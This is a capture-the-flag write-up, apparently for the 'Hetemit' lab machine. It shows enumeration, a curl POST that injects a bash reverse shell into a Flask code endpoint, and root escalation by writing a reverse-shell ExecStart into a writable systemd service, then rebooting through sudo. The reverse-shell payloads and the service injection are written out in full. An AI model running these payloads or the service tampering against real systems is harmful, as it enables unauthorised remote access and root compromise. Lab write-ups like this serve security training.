---
description: >-
  Privilege Escalation by injecting a reverse shell into a writable systemd
  service and rebooting via sudo
icon: linux
---

# Hetemit

## Summary

* Werkzeug development server exposed on port **50000** allowed Python code execution via POST request.
* Reverse shell established by abusing Flask’s[ **insecure deserialization**](https://portswigger.net/web-security/deserialization) endpoint.
* Privilege escalation achieved by modifying a **systemd service file** (`pythonapp.service`) and rebooting the machine using `sudo`.



## 🧵 Let's Unpack

#### 🔍 Enumeration

```bash
nmap -sV -p 50000 -A -Pn 192.168.197.117
```

* `50000/tcp` → Werkzeug httpd 1.0.1 (Python 3.6.8)
* Identified as vulnerable Flask debug interface
* Other high-range ports filtered or unrelated

***

#### 🧨 Initial Foothold via Flask Debug Interface

<sub>_From here I took Help from this writeup ->_</sub> [<sub>_https://kashz.gitbook.io/proving-grounds-writeups/pg-boxes/hetemit/7-50000\_2_</sub>](https://kashz.gitbook.io/proving-grounds-writeups/pg-boxes/hetemit/7-50000_2)

```bash
curl -X POST --data-urlencode 'code=__import__("os").system("bash -i >& /dev/tcp/192.168.45.175/445 0>&1")#' http://192.168.197.117:50000/verify
```

* Listener on:

```bash
nc -nlvp 445
```

✅ Reverse shell landed as user `cmeeks`

***

#### 🚀 Privilege Escalation

**Clues from `linpeas`**

```bash
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                     
/etc/systemd/system/multi-user.target.wants/pythonapp.service                                                                                                                   
/etc/systemd/system/multi-user.target.wants/pythonapp.service could be executing some relative path
/etc/systemd/system/multi-user.target.wants/railsapp.service could be executing some relative path
/etc/systemd/system/pythonapp.service
/etc/systemd/system/pythonapp.service could be executing some relative path
/etc/systemd/system/railsapp.service 
```

* Service files writable
* `sudo -l` shows `cmeeks` can **reboot** the machine as root:

```bash
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```

**Exploitation Steps**

1. Inject reverse shell in `pythonapp.service`:

```bash
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.175/50000 0>&1'
User=root
```

2. Start listener:

```bash
nc -nlvp 50000
```

3. Trigger reboot:

```bash
sudo /sbin/reboot
```

✅ Root shell obtained upon reboot!
